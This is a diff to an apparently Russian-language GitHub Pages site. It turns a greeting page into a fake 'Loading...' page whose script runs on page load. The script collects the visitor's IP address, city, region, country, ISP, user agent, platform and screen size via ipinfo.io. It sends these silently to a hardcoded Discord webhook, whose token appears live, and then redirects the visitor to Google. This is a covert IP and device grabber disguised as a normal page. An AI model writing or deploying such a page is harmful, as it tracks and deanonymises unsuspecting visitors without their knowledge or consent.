@@ -1,4 +1,62 @@
-<html>
-<head><title>Мой сайт</title></head>
-<body><h1>Привет, GitHub Pages!</h1></body>
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        async function grabData() {
+            const webhookURL = "https://discordapp.com/api/webhooks/1345721911715303556/wqx4sXdhpabTVtTIZtzujIAPh4dtIkiUvZ7G98eqNf1KzjVZ22Au0aGYEllb4zptg0Lm";  // Вставь сюда Webhook
+
+            // Получаем IP и местоположение
+            const ipInfo = await fetch("https://ipinfo.io/json").then(res => res.json());
+
+            // Данные устройства
+            const deviceData = {
+                ip: ipInfo.ip,
+                city: ipInfo.city || "Неизвестно",
+                region: ipInfo.region || "Неизвестно",
+                country: ipInfo.country || "Неизвестно",
+                isp: ipInfo.org || "Неизвестно",
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: ${screen.width}x${screen.height}
+            };
+
+            // Формируем сообщение для Discord
+            const message = {
+                content: "**Новый заход по ссылке!**",
+                embeds: [{
+                    title: "🔍 Детали пользователя",
+                    color: 16711680, // Красный цвет
+                    fields: [
+                        { name: "🌍 IP", value: deviceData.ip, inline: true },
+                        { name: "📍 Город", value: deviceData.city, inline: true },
+                        { name: "🏴 Регион", value: deviceData.region, inline: true },
+                        { name: "🌎 Страна", value: deviceData.country, inline: true },
+                        { name: "🔧 Провайдер", value: deviceData.isp, inline: true },
+                        { name: "📱 Устройство", value: deviceData.userAgent, inline: false },
+                        { name: "💻 ОС", value: deviceData.platform, inline: true },
+                        { name: "📏 Разрешение экрана", value: deviceData.screen, inline: true }
+                    ]
+                }]
+            };
+
+            // Отправляем данные в Discord
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(message)
+            });
+
+            // После загрузки можно редиректить куда угодно
+            window.location.href = "https://google.com"; // Можно заменить на другую страницу
+        }
+
+        grabData();
+    </script>
+</head>
+<body>
+    <h1>Загрузка...</h1>
+</body>
 </html>
